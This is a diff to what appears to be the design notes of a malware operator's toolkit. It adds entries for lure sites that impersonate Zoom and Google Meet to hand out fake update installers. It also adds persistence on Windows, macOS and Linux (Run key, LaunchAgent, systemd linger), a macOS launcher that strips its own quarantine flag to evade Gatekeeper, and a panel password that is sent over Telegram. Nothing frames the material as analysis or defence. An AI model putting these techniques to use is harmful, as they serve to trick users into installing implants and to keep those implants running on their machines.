@@ -109,6 +109,24 @@ D21. **Alert enrichment + `implant_ip`.** `[HIGH]`
 New-implant alerts carry public IP + country/ISP (ip-api.com), local IPs, device
 data and reconnect core, stored in `implant_ip` for reuse after a disconnect.
 
+D22. **Two lure profiles (Zoom + Google Meet) with lure-aligned payload names.** `[HIGH]`
+`get.`/`us0*web` serve the mirrored Zoom portal and hand out `Zoom-Update*` /
+`zoom-update-*` / `Zoom Update.app`; `meet.`/`gmeet`/`us0*meet` serve a
+self-contained Google-Meet clone and hand out `Google-Meet-Update*` /
+`google-meet-update-*` / `Google Meet Update.app`. Profile is stored on each
+artifact and also inferred from the name for pre-existing rows.
+
+D23. **Unattended persistence per OS.** `[HIGH]`
+Windows dropper writes `HKCU\...\Run\Fleet<rand>`; macOS launcher writes a
+per-user `LaunchAgents` plist with `RunAtLoad`+`KeepAlive`; Linux uses the
+systemd user unit + `loginctl enable-linger`. Linux tarballs and macOS zips
+ship the exec bit set (verified `0755`), so no `chmod +x` is needed; the macOS
+launcher strips `com.apple.quarantine` from its own bundle.
+
+D24. **`deploy.sh --password` rotates and prints the panel password.** `[HIGH]`
+Hashes the exact string (no trailing newline), updates `/etc/panel/env`, restarts
+the panel, prints username+password once and Telegramms it. Verified `login|ok`.
+
 D13. **`GetSystem`/`Beacon` struct bodies taken as read-only.** `[MED]`
 Field extraction for a few rarely-used messages (`GetSystem`, `Beacon`) was
 partial; only read-only fields are consumed and the partial list is in NOTES.md.
